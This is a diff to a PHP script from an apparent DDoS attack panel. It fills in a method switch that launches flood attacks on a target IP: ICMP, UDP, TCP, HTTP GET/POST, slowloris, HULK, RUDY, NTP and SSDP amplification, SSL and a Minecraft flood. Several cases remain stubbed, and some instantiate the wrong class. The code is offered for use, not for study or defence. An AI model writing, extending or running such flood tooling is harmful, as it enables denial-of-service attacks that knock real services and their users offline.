@@ -1,6 +1,5 @@
 <?php
-include_once "header.php";
-
+	include_once "header.php";
 	//Number of socket
 	if(!empty($_POST['builds'])){
 		$socketn = $_POST['builds'];
@@ -47,14 +46,10 @@ include_once "header.php";
 		$thread = $_POST['thread'];   
 	}else{$thread = 60;}*/
 
-	
-
-
 	$packets = 0;
 	$starttime = date("Y-m-d H:i:s");
 	$max_time = time()+$exec_time;
 
-	
 
 	ignore_user_abort(FALSE); 
 	ini_set('max_execution_time', $max_time);
@@ -64,58 +59,94 @@ include_once "header.php";
 	
 	switch ($method) {
     case "icmp":
-        
+        include_once "../class/flood/icmp.php";
+    	$worker = new icmp($attack->getIp(), $attack->getMax_time());
+    	$packets +=$worker->start();
         break;
     case "smurf":
-        
+        echo "Not work yet";
         break;
     case "udp":
-        
+        include_once "../class/flood/fourflood.php";
+        $worker = new fourflood($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getMax_time(), "udp");
+    	$packets +=$worker->start();
         break;
     case "tcp":
-        
+        include_once "../class/flood/fourflood.php";
+        $worker = new fourflood($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getMax_time(), "tcp");
+    	$packets +=$worker->start();
         break;
     case "syn":
-		
+		echo "Not work yet";
 		break;
 	case "get":
-		
+		include_once "../class/flood/sevenfloods.php";
+		$worker = new fourflood($attack->getIp(), $attack->getMax_time(), "GET");
+    	$packets +=$worker->start();
 		break;
 	case "post":
-		
+		include_once "../class/flood/sevenfloods.php";
+		$worker = new fourflood($attack->getIp(), $attack->getMax_time(), "POST");
+    	$packets +=$worker->start();
+		break;
+	case "404":
+		include_once "../class/flood/sevenfloods.php";
+		$worker = new fourflood($attack->getIp(), $attack->getMax_time(), "404");
+    	$packets +=$worker->start();
 		break;
 	case "slowloris":
-		
+		include_once "../class/flood/slowloris.php";
+    	$worker = new slowloris($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
+    	$packets +=$worker->start();
 		break;
 	case "arme":
 		include_once "../class/flood/arme.php";
     	$worker = new arme($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
     	$packets +=$worker->start();
-		echo $packets;
+		break;
+	case "hulk":
+		include_once "../class/flood/hulk.php";
+    	$worker = new hulk($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
+    	$packets +=$worker->start();
 		break;
 	case "rudy":
-		
+		include_once "../class/flood/rudy.php";
+    	$worker = new rudy($attack->getIp(), $attack->getPort(), $attack->getSocketn(), $attack->getMax_time());
+    	$packets +=$worker->start();
 		break;
 	case "ntpattack":
-		
+		include_once "../class/flood/ntpattack.php";
+		$worker = new ntpattack($attack->getIp(), $attack->getMax_time());
+    	$packets +=$worker->start();
 		break;
 	case "ssdpattack":
-		
+		include_once "../class/flood/ssdpattack.php";
+		$worker = new ssdpattack($attack->getIp(), $attack->getPort(), $attack->getMax_time());
+    	$packets +=$worker->start();
+		break;
+	case "toxicssl":
+		include_once "../class/flood/toxicssl.php";
+    	$worker = new toxicssl($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
+    	$packets +=$worker->start();
 		break;
 	case "ssl":
-		
-		break;
+		include_once "../class/flood/fourflood.php";
+        $worker = new fourflood($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getMax_time(), "ssl");
+    	$packets +=$worker->start();
+        break;
 	case "minecraftbandwitdh":
-		
+		include_once "../class/flood/minecraftflood.php";
+    	$worker = new rudy($attack->getIp(), $attack->getPort(), $attack->getMax_time());
+    	$packets +=$worker->start();
 		break;
 	case "hoic": 
-		
+		echo "Not work yet";
 		break;
 	case "":
 		echo "404 - Method Not Found";
 		break;
 	}
-
+	echo $packets;
 
 
 
